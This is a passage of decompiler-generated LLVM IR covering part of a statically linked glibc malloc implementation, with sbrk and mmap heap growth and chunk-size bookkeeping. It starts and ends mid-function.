  %v3_8052316 = load i32, i32* %v2_8052316, align 4
  store i32 %v3_8052316, i32* %edx.global-to-local, align 4
  %v12_8052319 = icmp eq i32 %v3_8052316, %v1_805233a
  %v1_805231b = icmp eq i1 %v12_8052319, false
  br i1 %v1_805231b, label %dec_label_pc_8052331, label %dec_label_pc_805231d

dec_label_pc_805231d:                             ; preds = %dec_label_pc_8052316
  %v1_805231f = add i32 %v3_8052316, 8
  store i32 %v1_805231f, i32* %ebx.global-to-local, align 4
  %v1_8052322 = sub i32 -1, %v0_8052326
  store i32 %v1_8052322, i32* %eax.global-to-local, align 4
  %v2_8052324 = and i32 %v0_8052324, %v1_8052322
  store i32 %v2_8052324, i32* @esi, align 4
  %v2_8052326 = mul i32 %v0_8052326, 2
  store i32 %v2_8052326, i32* @edi, align 4
  %v1_8052328 = load i32, i32* @ebp, align 4
  %v2_8052328 = mul i32 %v1_8052328, 4
  %v3_8052328 = add i32 %v2_8052328, ptrtoint (i32* @global_var_805adb4.288 to i32)
  %v4_8052328 = inttoptr i32 %v3_8052328 to i32*
  store i32 %v2_8052324, i32* %v4_8052328, align 4
  %v0_80522de.pre = load i32, i32* @edi, align 4
  %v1_80522de.pre = load i32, i32* @esi, align 4
  br label %.preheader

dec_label_pc_8052331:                             ; preds = %dec_label_pc_8052316
  %v1_8052331 = add i32 %v3_8052316, 4
  %v2_8052331 = inttoptr i32 %v1_8052331 to i32*
  %v3_8052331 = load i32, i32* %v2_8052331, align 4
  store i32 %v3_8052331, i32* %ecx.global-to-local, align 4
  %v1_8052334 = add i32 %v3_8052316, 12
  %v2_8052334 = inttoptr i32 %v1_8052334 to i32*
  %v3_8052334 = load i32, i32* %v2_8052334, align 4
  store i32 %v3_8052334, i32* %eax.global-to-local, align 4
  %v1_8052337 = and i32 %v3_8052331, -4
  store i32 %v1_8052337, i32* @ecx, align 4
  store i32 %v3_8052334, i32* %v2_8052316, align 4
  %v0_805233d = load i32, i32* @ecx, align 4
  store i32 %v0_805233d, i32* %esi.global-to-local, align 4
  %v0_805233f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805233f = load i32, i32* %eax.global-to-local, align 4
  %v2_805233f = add i32 %v1_805233f, 8
  %v3_805233f = inttoptr i32 %v2_805233f to i32*
  store i32 %v0_805233f, i32* %v3_805233f, align 4
  %v0_8052342 = load i32, i32* %esi.global-to-local, align 4
  %v5_8052342 = sub i32 %v0_8052342, %v1_8052434
  store i32 %v5_8052342, i32* %esi.global-to-local, align 4
  %tmp148 = icmp ult i32 %v5_8052342, 16
  br i1 %tmp148, label %dec_label_pc_805234b, label %dec_label_pc_8052355

dec_label_pc_805234b:                             ; preds = %dec_label_pc_8052331
  %v0_805234b = load i32, i32* %edx.global-to-local, align 4
  %v1_805234b = load i32, i32* @ecx, align 4
  %v2_805234b = add i32 %v0_805234b, 4
  %v3_805234b = add i32 %v2_805234b, %v1_805234b
  %v4_805234b = inttoptr i32 %v3_805234b to i32*
  %v5_805234b = load i32, i32* %v4_805234b, align 4
  %v6_805234b = or i32 %v5_805234b, 1
  store i32 %v6_805234b, i32* %v4_805234b, align 4
  br label %dec_label_pc_80520ad

dec_label_pc_8052355:                             ; preds = %dec_label_pc_8052331
  store i32 %v1_8052434, i32* %eax.global-to-local, align 4
  store i32 %v0_805220f.lcssa, i32* %ebx.global-to-local, align 4
  %v0_8052362 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052362 = add i32 %v0_8052362, %v1_8052434
  store i32 %v2_8052362, i32* @ecx, align 4
  %v2_8052365 = add i32 %v0_805220f.lcssa, 8
  %v3_8052365 = inttoptr i32 %v2_8052365 to i32*
  store i32 %v2_8052362, i32* %v3_8052365, align 4
  %v0_8052368 = load i32, i32* @ecx, align 4
  %v1_8052368 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052368 = add i32 %v1_8052368, 12
  %v3_8052368 = inttoptr i32 %v2_8052368 to i32*
  store i32 %v0_8052368, i32* %v3_8052368, align 4
  %v0_805236b = load i32, i32* @ecx, align 4
  %v1_805236b = add i32 %v0_805236b, 8
  %v2_805236b = inttoptr i32 %v1_805236b to i32*
  store i32 ptrtoint (i32* @global_var_805aab4.287 to i32), i32* %v2_805236b, align 4
  %v0_8052372 = load i32, i32* @ecx, align 4
  %v1_8052372 = add i32 %v0_8052372, 12
  %v2_8052372 = inttoptr i32 %v1_8052372 to i32*
  store i32 ptrtoint (i32* @global_var_805aab4.287 to i32), i32* %v2_8052372, align 4
  %v1_805238a.pre = load i32, i32* @ecx, align 4
  br i1 %v6_8052080, label %dec_label_pc_8052381, label %dec_label_pc_805237b

dec_label_pc_805237b:                             ; preds = %dec_label_pc_8052355
  store i32 %v1_805238a.pre, i32* @global_var_805aab0.284, align 16
  br label %dec_label_pc_8052381

dec_label_pc_8052381:                             ; preds = %dec_label_pc_8052355, %dec_label_pc_805237b
  %v4_8052381 = or i32 %v1_8052434, 1
  store i32 %v4_8052381, i32* %eax.global-to-local, align 4
  %v0_805238a = load i32, i32* %esi.global-to-local, align 4
  %v3_805238a = add i32 %v0_805238a, %v1_805238a.pre
  %v4_805238a = inttoptr i32 %v3_805238a to i32*
  store i32 %v0_805238a, i32* %v4_805238a, align 4
  %v0_805238d = load i32, i32* %eax.global-to-local, align 4
  %v1_805238d = load i32, i32* %edx.global-to-local, align 4
  %v2_805238d = add i32 %v1_805238d, 4
  %v3_805238d = inttoptr i32 %v2_805238d to i32*
  store i32 %v0_805238d, i32* %v3_805238d, align 4
  %v0_8052390 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052392 = or i32 %v0_8052390, 1
  store i32 %v1_8052392, i32* %eax.global-to-local, align 4
  %v1_8052395 = load i32, i32* @ecx, align 4
  %v2_8052395 = add i32 %v1_8052395, 4
  %v3_8052395 = inttoptr i32 %v2_8052395 to i32*
  store i32 %v1_8052392, i32* %v3_8052395, align 4
  br label %dec_label_pc_80520ad

dec_label_pc_805239d.loopexit:                    ; preds = %dec_label_pc_80522e6
  br label %dec_label_pc_805239d

dec_label_pc_805239d:                             ; preds = %dec_label_pc_805239d.loopexit, %dec_label_pc_805203c, %dec_label_pc_8052044
  %v0_805239d = load i32, i32* @global_var_805aaac.283, align 4
  store i32 %v0_805239d, i32* @ebx, align 4
  %v1_80523a7 = add i32 %v1_8052434, 16
  store i32 %v1_80523a7, i32* %edx.global-to-local, align 4
  %v1_80523aa = add i32 %v0_805239d, 4
  %v2_80523aa = inttoptr i32 %v1_80523aa to i32*
  %v3_80523aa = load i32, i32* %v2_80523aa, align 4
  %v1_80523b1 = and i32 %v3_80523aa, -4
  store i32 %v1_80523b1, i32* %ecx.global-to-local, align 4
  %v7_80523b4 = icmp ult i32 %v1_80523b1, %v1_80523a7
  br i1 %v7_80523b4, label %dec_label_pc_80523dd, label %dec_label_pc_80523b8

dec_label_pc_80523b8:                             ; preds = %dec_label_pc_805239d
  %v5_80523bc = sub i32 %v1_80523b1, %v1_8052434
  %v2_80523c0 = add i32 %v0_805239d, %v1_8052434
  store i32 %v2_80523c0, i32* %edx.global-to-local, align 4
  %v1_80523c3 = or i32 %v5_80523bc, 1
  store i32 %v1_80523c3, i32* @ecx, align 4
  %v1_80523c6 = or i32 %v1_8052434, 1
  store i32 %v1_80523c6, i32* %eax.global-to-local, align 4
  store i32 %v2_80523c0, i32* @global_var_805aaac.283, align 4
  store i32 %v1_80523c6, i32* %v2_80523aa, align 4
  %v0_80523d2 = load i32, i32* @ecx, align 4
  %v1_80523d2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80523d2 = add i32 %v1_80523d2, 4
  %v3_80523d2 = inttoptr i32 %v2_80523d2 to i32*
  store i32 %v0_80523d2, i32* %v3_80523d2, align 4
  br label %dec_label_pc_80523d5

dec_label_pc_80523d5:                             ; preds = %dec_label_pc_8052165, %dec_label_pc_8052106, %dec_label_pc_80523b8
  %v0_80523d5 = load i32, i32* @ebx, align 4
  %v1_80523d5 = add i32 %v0_80523d5, 8
  store i32 %v1_80523d5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052746

dec_label_pc_80523dd:                             ; preds = %dec_label_pc_805239d
  %v0_80523dd = load i32, i32* @global_var_805addc.289, align 4
  store i32 %v0_80523dd, i32* %edx.global-to-local, align 4
  %v0_80523e3 = load i8, i8* @global_var_805aa80.281, align 128
  %v1_80523e3 = and i8 %v0_80523e3, 2
  %v2_80523e3 = icmp eq i8 %v1_80523e3, 0
  br i1 %v2_80523e3, label %dec_label_pc_805240a, label %dec_label_pc_80523ec

dec_label_pc_80523ec:                             ; preds = %dec_label_pc_80523dd
  store i32 ptrtoint (i8* @global_var_805aa80.281 to i32), i32* %stack_var_-72, align 4
  %v2_80523f1 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805aa80.281 to i32*))
  %v1_80523fa = add i32 %v1_8052434, -7
  store i32 %v1_80523fa, i32* %eax.global-to-local, align 4
  %v1_80523fe = call i32 @malloc(i32 %v1_80523fa)
  store i32 %v1_80523fe, i32* %eax.global-to-local, align 4
  store i32 %v1_80523fa, i32* %ebx.global-to-local, align 4
  %v2_8052404 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_8052404, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052744

dec_label_pc_805240a:                             ; preds = %dec_label_pc_80523dd
  %v1_805240a = add i32 %v0_80523dd, -1
  store i32 %v1_805240a, i32* %ecx.global-to-local, align 4
  store i32 %v1_8052434, i32* %ebx.global-to-local, align 4
  %v1_8052415 = load i32, i32* @global_var_805adcc.290, align 4
  %v7_8052415 = icmp ult i32 %v1_8052434, %v1_8052415
  br i1 %v7_8052415, label %dec_label_pc_80524d5, label %dec_label_pc_8052421

dec_label_pc_8052421:                             ; preds = %dec_label_pc_805240a
  %v0_8052421 = load i32, i32* @global_var_805add0.291, align 16
  store i32 %v0_8052421, i32* %eax.global-to-local, align 4
  %v1_8052426 = load i32, i32* @global_var_805add4.292, align 4
  %v5_805242c = icmp slt i32 %v0_8052421, %v1_8052426
  br i1 %v5_805242c, label %dec_label_pc_8052432, label %dec_label_pc_80524d5

dec_label_pc_8052432:                             ; preds = %dec_label_pc_8052421
  %v2_8052434 = add i32 %v1_8052434, 10
  %v3_8052434 = add i32 %v2_8052434, %v0_80523dd
  %v1_8052438 = sub i32 0, %v0_80523dd
  store i32 %v1_8052438, i32* %eax.global-to-local, align 4
  %v2_805243a = and i32 %v3_8052434, %v1_8052438
  store i32 %v2_805243a, i32* @ebx, align 4
  %tmp149 = icmp ugt i32 %v2_805243a, %v1_8052434
  br i1 %tmp149, label %dec_label_pc_8052446, label %dec_label_pc_80524d5

dec_label_pc_8052446:                             ; preds = %dec_label_pc_8052432
  store i32 0, i32* %stack_var_-72, align 4
  %v6_8052451 = call i32 @mmap(i32 0, i32 %v2_805243a, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_8052451, i32* %eax.global-to-local, align 4
  store i32 %v6_8052451, i32* %edx.global-to-local, align 4
  %v10_805245b = icmp eq i32 %v6_8052451, -1
  br i1 %v10_805245b, label %dec_label_pc_8052446.dec_label_pc_80524d5_crit_edge, label %dec_label_pc_8052460

dec_label_pc_8052446.dec_label_pc_80524d5_crit_edge: ; preds = %dec_label_pc_8052446
  %v0_80524d5.pre = load i32, i32* @global_var_805aaac.283, align 4
  br label %dec_label_pc_80524d5

dec_label_pc_8052460:                             ; preds = %dec_label_pc_8052446
  %v1_8052462 = urem i32 %v6_8052451, 8
  %v2_8052462 = icmp eq i32 %v1_8052462, 0
  store i32 %v1_8052462, i32* @ecx, align 4
  br i1 %v2_8052462, label %dec_label_pc_805247a, label %dec_label_pc_8052467

dec_label_pc_8052467:                             ; preds = %dec_label_pc_8052460
  %v2_805246c = sub nsw i32 8, %v1_8052462
  store i32 %v2_805246c, i32* %eax.global-to-local, align 4
  %v0_805246e = load i32, i32* @ebx, align 4
  %v2_8052470 = add i32 %v2_805246c, %v6_8052451
  store i32 %v2_8052470, i32* %edx.global-to-local, align 4
  %v2_8052472 = sub i32 %v0_805246e, %v2_805246c
  store i32 %v2_8052472, i32* @ecx, align 4
  %v2_8052474 = inttoptr i32 %v2_8052470 to i32*
  store i32 %v2_805246c, i32* %v2_8052474, align 4
  br label %dec_label_pc_8052482

dec_label_pc_805247a:                             ; preds = %dec_label_pc_8052460
  %v1_805247a = inttoptr i32 %v6_8052451 to i32*
  store i32 0, i32* %v1_805247a, align 4
  br label %dec_label_pc_8052482

dec_label_pc_8052482:                             ; preds = %dec_label_pc_8052467, %dec_label_pc_805247a
  %storemerge.in = phi i32* [ @ecx, %dec_label_pc_8052467 ], [ @ebx, %dec_label_pc_805247a ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8052482 = or i32 %storemerge, 2
  %v1_8052485 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052485 = add i32 %v1_8052485, 4
  %v3_8052485 = inttoptr i32 %v2_8052485 to i32*
  store i32 %v1_8052482, i32* %v3_8052485, align 4
  %v0_8052488 = load i32, i32* @global_var_805add0.291, align 16
  %v1_805248d = add i32 %v0_8052488, 1
  store i32 %v1_805248d, i32* %eax.global-to-local, align 4
  store i32 %v1_805248d, i32* @global_var_805add0.291, align 16
  %v1_8052493 = load i32, i32* @global_var_805add8.293, align 8
  %v7_8052499 = icmp sgt i32 %v1_805248d, %v1_8052493
  br i1 %v7_8052499, label %dec_label_pc_805249b, label %dec_label_pc_80524a0

dec_label_pc_805249b:                             ; preds = %dec_label_pc_8052482
  store i32 %v1_805248d, i32* @global_var_805add8.293, align 8
  br label %dec_label_pc_80524a0

dec_label_pc_80524a0:                             ; preds = %dec_label_pc_8052482, %dec_label_pc_805249b
  %v0_80524a0 = load i32, i32* @ebx, align 4
  %v1_80524a2 = load i32, i32* @global_var_805ade4.294, align 4
  %v2_80524a2 = add i32 %v1_80524a2, %v0_80524a0
  store i32 %v2_80524a2, i32* %eax.global-to-local, align 4
  store i32 %v2_80524a2, i32* @global_var_805ade4.294, align 4
  %v1_80524ad = load i32, i32* @global_var_805adf0.295, align 16
  %tmp150 = icmp ugt i32 %v2_80524a2, %v1_80524ad
  br i1 %tmp150, label %dec_label_pc_80524b5, label %dec_label_pc_80524ba

dec_label_pc_80524b5:                             ; preds = %dec_label_pc_80524a0
  store i32 %v2_80524a2, i32* @global_var_805adf0.295, align 16
  br label %dec_label_pc_80524ba

dec_label_pc_80524ba:                             ; preds = %dec_label_pc_80524a0, %dec_label_pc_80524b5
  %v1_80524ba = load i32, i32* @global_var_805ade8.296, align 8
  %v2_80524ba = add i32 %v1_80524ba, %v2_80524a2
  store i32 %v2_80524ba, i32* %eax.global-to-local, align 4
  %v1_80524c0 = load i32, i32* @global_var_805adf4.297, align 4
  %tmp151 = icmp ugt i32 %v2_80524ba, %v1_80524c0
  br i1 %tmp151, label %dec_label_pc_80524c8, label %dec_label_pc_80524cd

dec_label_pc_80524c8:                             ; preds = %dec_label_pc_80524ba
  store i32 %v2_80524ba, i32* @global_var_805adf4.297, align 4
  br label %dec_label_pc_80524cd

dec_label_pc_80524cd:                             ; preds = %dec_label_pc_80524ba, %dec_label_pc_80524c8
  %v0_80524cd = load i32, i32* %edx.global-to-local, align 4
  %v1_80524cd = add i32 %v0_80524cd, 8
  store i32 %v1_80524cd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052744

dec_label_pc_80524d5:                             ; preds = %dec_label_pc_8052432, %dec_label_pc_8052446.dec_label_pc_80524d5_crit_edge, %dec_label_pc_8052421, %dec_label_pc_805240a
  %v0_80524d5 = phi i32 [ %v0_80524d5.pre, %dec_label_pc_8052446.dec_label_pc_80524d5_crit_edge ], [ %v0_805239d, %dec_label_pc_8052421 ], [ %v0_805239d, %dec_label_pc_8052432 ], [ %v0_805239d, %dec_label_pc_805240a ]
  store i32 %v0_80524d5, i32* %ebx.global-to-local, align 4
  %v1_80524df = add i32 %v0_80524d5, 4
  %v2_80524df = inttoptr i32 %v1_80524df to i32*
  %v3_80524df = load i32, i32* %v2_80524df, align 4
  %v1_80524e2 = and i32 %v3_80524df, -4
  %v2_80524e2 = icmp eq i32 %v1_80524e2, 0
  %v0_80524e9 = load i32, i32* @global_var_805adc8.298, align 8
  %v5_80524f1 = add i32 %v1_80523a7, %v0_80524e9
  store i32 %v5_80524f1, i32* %eax.global-to-local, align 4
  %v0_80524f5 = load i8, i8* @global_var_805ade0.299, align 32
  %v1_80524f5 = urem i8 %v0_80524f5, 2
  %v2_80524f5 = icmp eq i8 %v1_80524f5, 0
  br i1 %v2_80524f5, label %dec_label_pc_8052504, label %dec_label_pc_8052500

dec_label_pc_8052500:                             ; preds = %dec_label_pc_80524d5
  %v5_8052500 = sub i32 %v5_80524f1, %v1_80524e2
  br label %dec_label_pc_8052504

dec_label_pc_8052504:                             ; preds = %dec_label_pc_80524d5, %dec_label_pc_8052500
  %storemerge157 = phi i32 [ %v5_8052500, %dec_label_pc_8052500 ], [ %v5_80524f1, %dec_label_pc_80524d5 ]
  %v0_805250e = phi i32 [ %v5_8052500, %dec_label_pc_8052500 ], [ %v5_80524f1, %dec_label_pc_80524d5 ]
  store i32 %storemerge157, i32* %edx.global-to-local, align 4
  store i32 %v1_805240a, i32* @ebx, align 4
  %v1_805250c = sub i32 0, %v0_80523dd
  store i32 %v1_805250c, i32* @ecx, align 4
  %v2_805250e = add i32 %v0_805250e, %v1_805240a
  %v2_8052515 = and i32 %v2_805250e, %v1_805250c
  store i32 %v2_8052515, i32* @esi, align 4
  store i32 %v2_8052515, i32* @edi, align 4
  %tmp103 = icmp slt i32 %v2_8052515, 1
  br i1 %tmp103, label %dec_label_pc_805252b, label %dec_label_pc_805251d

dec_label_pc_805251d:                             ; preds = %dec_label_pc_8052504
  store i32 %v2_8052515, i32* %stack_var_-72, align 4
  %v1_805251e = call i32 @__GI_sbrk(i32 %v2_8052515)
  store i32 %v1_805251e, i32* %eax.global-to-local, align 4
  store i32 %v2_8052515, i32* @ecx, align 4
  store i32 %v1_805251e, i32* @ebx, align 4
  %v10_8052526 = icmp eq i32 %v1_805251e, -1
  %v1_8052529 = icmp eq i1 %v10_8052526, false
  br i1 %v1_8052529, label %dec_label_pc_8052583.dec_label_pc_805258c_crit_edge, label %dec_label_pc_805251d.dec_label_pc_805252b_crit_edge

dec_label_pc_805251d.dec_label_pc_805252b_crit_edge: ; preds = %dec_label_pc_805251d
  %v0_805252b.pre = load i8, i8* @global_var_805ade0.299, align 32
  br label %dec_label_pc_805252b

dec_label_pc_805252b:                             ; preds = %dec_label_pc_805251d.dec_label_pc_805252b_crit_edge, %dec_label_pc_8052504
  %v0_805252b = phi i8 [ %v0_805252b.pre, %dec_label_pc_805251d.dec_label_pc_805252b_crit_edge ], [ %v0_80524f5, %dec_label_pc_8052504 ]
  %v1_805252b = urem i8 %v0_805252b, 2
  %v2_805252b = icmp eq i8 %v1_805252b, 0
  br i1 %v2_805252b, label %dec_label_pc_805252b.dec_label_pc_8052543_crit_edge, label %dec_label_pc_8052534

dec_label_pc_805252b.dec_label_pc_8052543_crit_edge: ; preds = %dec_label_pc_805252b
  %v0_8052543.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052543

dec_label_pc_8052534:                             ; preds = %dec_label_pc_805252b
  %v5_8052538 = add i32 %v1_80524e2, %v1_805240a
  store i32 %v5_8052538, i32* %eax.global-to-local, align 4
  %v1_805253c = load i32, i32* @esi, align 4
  %v2_805253c = add i32 %v1_805253c, %v5_8052538
  %v5_805253f = and i32 %v2_805253c, %v1_805250c
  store i32 %v5_805253f, i32* @edi, align 4
  br label %dec_label_pc_8052543

dec_label_pc_8052543:                             ; preds = %dec_label_pc_805252b.dec_label_pc_8052543_crit_edge, %dec_label_pc_8052534
  %v0_8052543 = phi i32 [ %v0_8052543.pre, %dec_label_pc_805252b.dec_label_pc_8052543_crit_edge ], [ %v5_805253f, %dec_label_pc_8052534 ]
  %tmp152 = icmp ult i32 %v0_8052543, 1048576
  br i1 %tmp152, label %dec_label_pc_805254b, label %dec_label_pc_8052550

dec_label_pc_805254b:                             ; preds = %dec_label_pc_8052543
  store i32 1048576, i32* @edi, align 4
  br label %dec_label_pc_8052550

dec_label_pc_8052550:                             ; preds = %dec_label_pc_8052543, %dec_label_pc_805254b
  %v0_8052562 = phi i32 [ %v0_8052543, %dec_label_pc_8052543 ], [ 1048576, %dec_label_pc_805254b ]
  %tmp153 = icmp ugt i32 %v0_8052562, %v1_8052434
  br i1 %tmp153, label %dec_label_pc_805255a, label %dec_label_pc_8052736

dec_label_pc_805255a:                             ; preds = %dec_label_pc_8052550
  store i32 0, i32* %stack_var_-72, align 4
  %v6_8052565 = call i32 @mmap(i32 0, i32 %v0_8052562, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_8052565, i32* %eax.global-to-local, align 4
  store i32 %v6_8052565, i32* @ebx, align 4
  %v10_805256f = icmp eq i32 %v6_8052565, -1
  br i1 %v10_805256f, label %dec_label_pc_8052583.thread107, label %dec_label_pc_8052583.thread

dec_label_pc_8052583.thread107:                   ; preds = %dec_label_pc_805255a
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052736

dec_label_pc_8052583.thread:                      ; preds = %dec_label_pc_805255a
  %v0_8052574 = load i8, i8* @global_var_805ade0.299, align 1
  %v2_8052574 = and i8 %v0_8052574, -2
  store i8 %v2_8052574, i8* @global_var_805ade0.299, align 32
  %v1_805257b = load i32, i32* @edi, align 4
  %v2_805257b = add i32 %v1_805257b, %v6_8052565
  store i32 %v2_805257b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805258c

dec_label_pc_8052583.dec_label_pc_805258c_crit_edge: ; preds = %dec_label_pc_805251d
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8052590.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805258c

dec_label_pc_805258c:                             ; preds = %dec_label_pc_8052583.dec_label_pc_805258c_crit_edge, %dec_label_pc_8052583.thread
  %v1_8052590 = phi i32 [ %v1_805257b, %dec_label_pc_8052583.thread ], [ %v1_8052590.pre, %dec_label_pc_8052583.dec_label_pc_805258c_crit_edge ]
  %v0_8052648106 = phi i32 [ %v2_805257b, %dec_label_pc_8052583.thread ], [ -1, %dec_label_pc_8052583.dec_label_pc_805258c_crit_edge ]
  %v0_805264d105 = phi i32 [ %v6_8052565, %dec_label_pc_8052583.thread ], [ %v1_805251e, %dec_label_pc_8052583.dec_label_pc_805258c_crit_edge ]
  %v0_8052590 = load i32, i32* @global_var_805ade8.296, align 8
  %v2_8052590 = add i32 %v1_8052590, %v0_8052590
  store i32 %v2_8052590, i32* @global_var_805ade8.296, align 8
  %v5_8052596 = add i32 %v1_80524e2, %v0_80524d5
  store i32 %v5_8052596, i32* %ecx.global-to-local, align 4
  %v2_805259a = sub i32 %v0_805264d105, %v5_8052596
  %v7_805259a = icmp ult i32 %v0_805264d105, %v5_8052596
  %v12_805259a = icmp eq i32 %v2_805259a, 0
  %v1_805259c = icmp eq i1 %v12_805259a, false
  br i1 %v1_805259c, label %dec_label_pc_80525b9, label %dec_label_pc_805259e

dec_label_pc_805259e:                             ; preds = %dec_label_pc_805258c
  %v10_805259e = icmp eq i32 %v0_8052648106, -1
  %v1_80525a1 = icmp eq i1 %v10_805259e, false
  br i1 %v1_80525a1, label %dec_label_pc_80525b9, label %dec_label_pc_80525a3

dec_label_pc_80525a3:                             ; preds = %dec_label_pc_805259e
  store i32 %v1_80524e2, i32* %edx.global-to-local, align 4
  store i32 %v0_80524d5, i32* %ecx.global-to-local, align 4
  %v2_80525ab = add i32 %v1_8052590, %v1_80524e2
  %v1_80525ae = or i32 %v2_80525ab, 1
  store i32 %v1_80525ae, i32* %eax.global-to-local, align 4
  store i32 %v1_80525ae, i32* %v2_80524df, align 4
  br label %dec_label_pc_80526dd

dec_label_pc_80525b9:                             ; preds = %dec_label_pc_805259e, %dec_label_pc_805258c
  %v0_80525b9 = load i8, i8* @global_var_805ade0.299, align 1
  %v1_80525b9 = sext i8 %v0_80525b9 to i32
  store i32 %v1_80525b9, i32* %eax.global-to-local, align 4
  %v2_80525be = urem i8 %v0_80525b9, 2
  %v3_80525be = icmp eq i8 %v2_80525be, 0
  br i1 %v3_80525be, label %dec_label_pc_80525d5, label %dec_label_pc_80525c2

dec_label_pc_80525c2:                             ; preds = %dec_label_pc_80525b9
  br i1 %v2_80524e2, label %dec_label_pc_80525d5, label %dec_label_pc_80525c9

dec_label_pc_80525c9:                             ; preds = %dec_label_pc_80525c2
  %v1_80525cb = icmp eq i1 %v7_805259a, false
  br i1 %v1_80525cb, label %dec_label_pc_80525d5, label %dec_label_pc_80525cd

dec_label_pc_80525cd:                             ; preds = %dec_label_pc_80525c9
  %v1_80525cd = and i32 %v1_80525b9, -2
  %v4_80525cd = trunc i32 %v1_80525cd to i8
  store i32 %v1_80525cd, i32* %eax.global-to-local, align 4
  store i8 %v4_80525cd, i8* @global_var_805ade0.299, align 32
  br label %dec_label_pc_80525d5

dec_label_pc_80525d5:                             ; preds = %dec_label_pc_80525c9, %dec_label_pc_80525c2, %dec_label_pc_80525b9, %dec_label_pc_80525cd
  %v0_80525d5 = phi i8 [ %v0_80525b9, %dec_label_pc_80525c9 ], [ %v0_80525b9, %dec_label_pc_80525c2 ], [ %v0_80525b9, %dec_label_pc_80525b9 ], [ %v4_80525cd, %dec_label_pc_80525cd ]
  %v1_80525d5 = urem i8 %v0_80525d5, 2
  %v2_80525d5 = icmp eq i8 %v1_80525d5, 0
  br i1 %v2_80525d5, label %dec_label_pc_8052648, label %dec_label_pc_80525de

dec_label_pc_80525de:                             ; preds = %dec_label_pc_80525d5
  br i1 %v2_80524e2, label %dec_label_pc_80525ef, label %dec_label_pc_80525e5

dec_label_pc_80525e5:                             ; preds = %dec_label_pc_80525de
  store i32 %v2_805259a, i32* %eax.global-to-local, align 4
  %v2_80525e9 = add i32 %v2_8052590, %v2_805259a
  store i32 %v2_80525e9, i32* @global_var_805ade8.296, align 8
  br label %dec_label_pc_80525ef

dec_label_pc_80525ef:                             ; preds = %dec_label_pc_80525de, %dec_label_pc_80525e5
  %v1_80525f1 = urem i32 %v0_805264d105, 8
  %v2_80525f1 = icmp eq i32 %v1_80525f1, 0
  store i32 %v1_80525f1, i32* %edx.global-to-local, align 4
  %v1_80525f4 = icmp eq i1 %v2_80525f1, false
  br i1 %v1_80525f4, label %dec_label_pc_80525fc, label %dec_label_pc_80525f6

dec_label_pc_80525f6:                             ; preds = %dec_label_pc_80525ef
  store i32 %v0_805264d105, i32* @ebp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052606

dec_label_pc_80525fc:                             ; preds = %dec_label_pc_80525ef
  %v2_8052601 = sub nsw i32 8, %v1_80525f1
  store i32 %v2_8052601, i32* %eax.global-to-local, align 4
  %v2_8052603 = add i32 %v2_8052601, %v0_805264d105
  store i32 %v2_8052603, i32* @ebp, align 4
  br label %dec_label_pc_8052606

dec_label_pc_8052606:                             ; preds = %dec_label_pc_80525f6, %dec_label_pc_80525fc
  %v0_805260d = phi i32 [ 0, %dec_label_pc_80525f6 ], [ %v2_8052601, %dec_label_pc_80525fc ]
  store i32 %v1_80524e2, i32* %ecx.global-to-local, align 4
  %v2_805260a = add i32 %v1_8052590, %v0_805264d105
  store i32 %v2_805260a, i32* @edi, align 4
  %v2_8052613 = sub i32 0, %v2_805260a
  store i32 %v2_8052613, i32* %edx.global-to-local, align 4
  %v2_805260d = add i32 %v1_80524e2, %v1_805240a
  %v2_8052610 = add i32 %v2_805260d, %v2_805260a
  %v5_8052615 = add i32 %v2_8052610, %v0_805260d
  %v5_8052619 = and i32 %v5_8052615, %v1_805250c
  store i32 %v5_8052619, i32* %eax.global-to-local, align 4
  %v2_805261d = sub i32 %v5_8052619, %v2_805260a
  store i32 %v2_805261d, i32* @esi, align 4
  store i32 %v2_805261d, i32* %stack_var_-72, align 4
  %v1_8052621 = call i32 @__GI_sbrk(i32 %v2_805261d)
  store i32 %v1_8052621, i32* %eax.global-to-local, align 4
  store i32 %v2_805261d, i32* %edx.global-to-local, align 4
  %v10_8052627 = icmp eq i32 %v1_8052621, -1
  %v1_805262a = icmp eq i1 %v10_8052627, false
  br i1 %v1_805262a, label %dec_label_pc_8052637, label %dec_label_pc_805262c

dec_label_pc_805262c:                             ; preds = %dec_label_pc_8052606
  store i32 0, i32* %stack_var_-72, align 4
  %v1_805262e = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805262e, i32* %eax.global-to-local, align 4
  store i32 %v1_805262e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052668

dec_label_pc_8052637:                             ; preds = %dec_label_pc_8052606
  store i32 %v1_8052621, i32* %edx.global-to-local, align 4
  %v1_8052639 = load i32, i32* @ebx, align 4
  %v7_8052639 = icmp ult i32 %v1_8052621, %v1_8052639
  %v1_805263b = icmp eq i1 %v7_8052639, false
  br i1 %v1_805263b, label %dec_label_pc_805266b, label %dec_label_pc_805263d

dec_label_pc_805263d:                             ; preds = %dec_label_pc_8052637
  %v0_805263d = load i8, i8* @global_var_805ade0.299, align 1
  %v2_805263d = and i8 %v0_805263d, -2
  store i8 %v2_805263d, i8* @global_var_805ade0.299, align 32
  %v0_8052644 = load i32, i32* @edi, align 4
  store i32 %v0_8052644, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805264f

dec_label_pc_8052648:                             ; preds = %dec_label_pc_80525d5
  %v10_8052648 = icmp eq i32 %v0_8052648106, -1
  br i1 %v10_8052648, label %dec_label_pc_8052653, label %dec_label_pc_805264d

dec_label_pc_805264d:                             ; preds = %dec_label_pc_8052648
  store i32 %v0_805264d105, i32* @ebp, align 4
